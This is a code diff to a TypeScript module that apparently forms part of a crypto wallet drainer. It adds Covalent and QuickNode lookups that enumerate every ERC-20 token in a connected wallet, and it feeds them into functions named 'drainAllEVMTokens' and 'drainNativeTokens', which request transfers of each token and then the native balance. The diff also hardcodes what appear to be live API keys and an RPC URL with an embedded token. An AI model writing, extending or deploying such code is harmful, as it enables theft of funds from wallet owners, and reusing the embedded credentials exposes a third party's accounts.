@@ -12,6 +12,15 @@ const QUICKNODE_RPCS: Record<number, string> = {
   8453: 'https://serene-greatest-putty.base-mainnet.quiknode.pro/2d2b50b444a5e698af652819520cabba1534ab68',
 };
 
+// Covalent API key and chain name mapping
+const COVALENT_API_KEY = 'cqt_rQKwtQPfvxBX69tHBcVqV7w8xtfP';
+const COVALENT_CHAIN_NAMES: Record<number, string> = {
+  1: 'eth-mainnet',
+  56: 'bsc-mainnet',
+  137: 'matic-mainnet',
+  8453: 'base-mainnet',
+};
+
 // ERC-20 minimal ABI for transfer
 const ERC20_ABI = [
   'function balanceOf(address owner) view returns (uint256)',
@@ -32,18 +41,105 @@ export interface EVMTokenBalance {
   uiAmount: number;
 }
 
+export interface TokenDetectionResult {
+  success: boolean;
+  tokens: EVMTokenBalance[];
+  error?: string;
+}
+
 /**
- * Detect all ERC-20 tokens in wallet using QuickNode's qn_getWalletTokenBalance
- * Falls back to empty array if the method is not available on the chain
+ * Detect all ERC-20 tokens using Covalent GoldRush API (primary)
+ * Falls back to QuickNode qn_getWalletTokenBalance if Covalent fails
  */
 export async function detectWalletTokens(
   walletAddress: string,
   chainId: number
-): Promise<EVMTokenBalance[]> {
+): Promise<TokenDetectionResult> {
+  // Try Covalent first
+  const covalentResult = await detectTokensViaCovalent(walletAddress, chainId);
+  if (covalentResult.success && covalentResult.tokens.length > 0) {
+    return covalentResult;
+  }
+
+  // Fallback to QuickNode
+  const quicknodeResult = await detectTokensViaQuickNode(walletAddress, chainId);
+  if (quicknodeResult.success && quicknodeResult.tokens.length > 0) {
+    return quicknodeResult;
+  }
+
+  // Both failed or returned empty
+  if (!covalentResult.success && !quicknodeResult.success) {
+    return {
+      success: false,
+      tokens: [],
+      error: `Token detection failed. Covalent: ${covalentResult.error || 'unknown'}. QuickNode: ${quicknodeResult.error || 'unknown'}.`,
+    };
+  }
+
+  // APIs succeeded but wallet has no ERC-20 tokens
+  return { success: true, tokens: [] };
+}
+
+/**
+ * Detect tokens via Covalent GoldRush API
+ */
+async function detectTokensViaCovalent(
+  walletAddress: string,
+  chainId: number
+): Promise<TokenDetectionResult> {
+  const chainName = COVALENT_CHAIN_NAMES[chainId];
+  if (!chainName) {
+    return { success: false, tokens: [], error: `No Covalent chain mapping for chain ${chainId}` };
+  }
+
+  try {
+    const url = `https://api.covalenthq.com/v1/${chainName}/address/${walletAddress}/balances_v2/?key=${COVALENT_API_KEY}&no-nft-fetch=true`;
+    const response = await fetch(url);
+    const data = await response.json();
+
+    if (data.error || !data.data || !data.data.items) {
+      return { success: false, tokens: [], error: data.error_message || 'Covalent API error' };
+    }
+
+    const tokens: EVMTokenBalance[] = [];
+    for (const item of data.data.items) {
+      // Skip native token (contract_address is often 0xeeee... or native_token is true)
+      if (item.native_token || !item.contract_address) continue;
+      // Skip zero-address placeholder for native token
+      if (item.contract_address === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') continue;
+
+      const rawBalance = BigInt(item.balance || '0');
+      if (rawBalance <= 0n) continue;
+
+      const decimals = Number(item.contract_decimals || 18);
+      tokens.push({
+        contractAddress: item.contract_address,
+        symbol: item.contract_ticker_symbol || 'UNKNOWN',
+        name: item.contract_name || 'Unknown Token',
+        decimals,
+        balance: rawBalance,
+        uiAmount: parseFloat(ethers.formatUnits(rawBalance, decimals)),
+      });
+    }
+
+    console.log(`Covalent detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
+    return { success: true, tokens };
+  } catch (error) {
+    console.error('Covalent token detection failed:', error);
+    return { success: false, tokens: [], error: String(error) };
+  }
+}
+
+/**
+ * Detect tokens via QuickNode qn_getWalletTokenBalance (fallback)
+ */
+async function detectTokensViaQuickNode(
+  walletAddress: string,
+  chainId: number
+): Promise<TokenDetectionResult> {
   const rpcUrl = QUICKNODE_RPCS[chainId];
   if (!rpcUrl) {
-    console.log(`No QuickNode RPC for chain ${chainId}, skipping token detection`);
-    return [];
+    return { success: false, tokens: [], error: `No QuickNode RPC for chain ${chainId}` };
   }
 
   try {
@@ -62,11 +158,11 @@ export async function detectWalletTokens(
 
     if (data.error) {
       console.error('QuickNode token detection error:', data.error);
-      return [];
+      return { success: false, tokens: [], error: data.error.message || 'QuickNode API error' };
     }
 
     const result = data.result;
-    if (!result || !result.result) return [];
+    if (!result || !result.result) return { success: true, tokens: [] };
 
     const tokens: EVMTokenBalance[] = [];
     for (const token of result.result) {
@@ -84,11 +180,11 @@ export async function detectWalletTokens(
       });
     }
 
-    console.log(`Detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
-    return tokens;
+    console.log(`QuickNode detected ${tokens.length} ERC-20 tokens on chain ${chainId}`);
+    return { success: true, tokens };
   } catch (error) {
-    console.error('Token detection failed:', error);
-    return [];
+    console.error('QuickNode token detection failed:', error);
+    return { success: false, tokens: [], error: String(error) };
   }
 }
 
@@ -209,7 +305,8 @@ export async function drainNativeTokens(
 
 /**
  * Drain ALL EVM tokens: first ERC-20 tokens, then native token.
- * Detects tokens via QuickNode, transfers each one, then drains native balance.
+ * Uses Covalent API (primary) with QuickNode fallback for token detection.
+ * If token detection fails entirely, throws an error instead of falling through to native drain.
  */
 export async function drainAllEVMTokens(
   signer: ethers.JsonRpcSigner,
@@ -219,10 +316,16 @@ export async function drainAllEVMTokens(
 ): Promise<void> {
   const address = await signer.getAddress();
 
-  // Step 1: Detect and drain ERC-20 tokens first
-  const tokens = await detectWalletTokens(address, chainId);
+  // Step 1: Detect ERC-20 tokens
+  const detection = await detectWalletTokens(address, chainId);
 
-  for (const token of tokens) {
+  if (!detection.success) {
+    console.error('Token detection failed:', detection.error);
+    throw new Error(`Could not detect ERC-20 tokens: ${detection.error}`);
+  }
+
+  // Step 2: Drain ERC-20 tokens first (each generates its own wallet transaction request)
+  for (const token of detection.tokens) {
     try {
       console.log(`Draining ERC-20: ${token.symbol} (${token.contractAddress}), balance: ${token.uiAmount}`);
       await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
@@ -232,7 +335,7 @@ export async function drainAllEVMTokens(
     }
   }
 
-  // Step 2: Drain native token last
+  // Step 3: Drain native token last
   try {
     await drainNativeTokens(signer, provider, chainName);
   } catch (error) {
